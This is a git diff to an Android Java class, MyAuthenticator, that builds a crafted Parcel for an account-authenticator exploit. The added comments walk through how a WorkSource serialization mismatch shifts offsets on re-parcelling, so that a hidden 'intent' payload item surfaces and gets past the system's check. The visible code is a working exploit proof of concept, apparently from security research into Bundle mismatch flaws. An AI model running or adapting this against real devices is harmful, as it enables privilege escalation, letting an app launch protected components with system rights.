@@ -64,18 +64,29 @@ public class MyAuthenticator extends AbstractAccountAuthenticator {
         fakeBundleKeyPairs.writeInt(-1); //mNum
         fakeBundleKeyPairs.writeInt(-1); //createIntArray, N=-1,will skip
         fakeBundleKeyPairs.writeInt(-1); // createStringArray, N=-1,will skip
-        fakeBundleKeyPairs.writeInt(1); //numChains=1
+        fakeBundleKeyPairs.writeInt(1); //numChains=1  //in second pass, the position is 104
         // the magic is here, we claim the chain has one item, but we passed an empty arraylist,
         // after unparcel, the arraylist will be empty
         // when parcel it again, the arraylist will be empty and the numChains will be 0
         fakeBundleKeyPairs.writeInt(-1); //readParcelableList, N=-1,will skip
+        //after parceled, unparcel, above will be the start of the item2, the String16 key
+        //which has a 4bytes size,followed by the key string in utf16
+        // in this case, length is -1, and we still will read the end of the key string,2bytes
+        // and the padding of 2btes, so total 8bytes
         //end of WrokSource
         //item2
         // item2 key string16, length =13
         fakeBundleKeyPairs.writeInt(13);
+        //after parceled, unparcel, above will be skiped as the end of the string,
+        // since we are not checking the padding values, 13 happened to be a valid padding value
+
         //begin of the string
         fakeBundleKeyPairs.writeInt(13);
+        //after parceled, unparcel, above will be the value type field, 13 is type VAL_BYTEARRAY
         fakeBundleKeyPairs.writeInt(68);
+        //after parceled, unparcel, above become the byte length of the array
+        //this is the critical part, it allow attacker to bypass the previous harmless item3 and
+        //point the item3 to our payload item4(whihc is not readed by the first time)
         fakeBundleKeyPairs.writeInt(11);
         fakeBundleKeyPairs.writeInt(0);
         fakeBundleKeyPairs.writeInt(7);
@@ -96,7 +107,7 @@ public class MyAuthenticator extends AbstractAccountAuthenticator {
         fakeBundleKeyPairs.writeInt(0); //string end and padding
         fakeBundleKeyPairs.writeInt(13); //type VAL_BYTEARRAY
         fakeBundleKeyPairs.writeInt(-1); // length = -1, will skip
-
+        //after parceled, unparcel, above become the end of item2,offset 68bytes
         int fakeBundleKV_item3_end_pos = fakeBundleKeyPairs.dataPosition();
         //I suppose it is still following the above format
         fakeBundleKeyPairs.writeString("intent"); //key
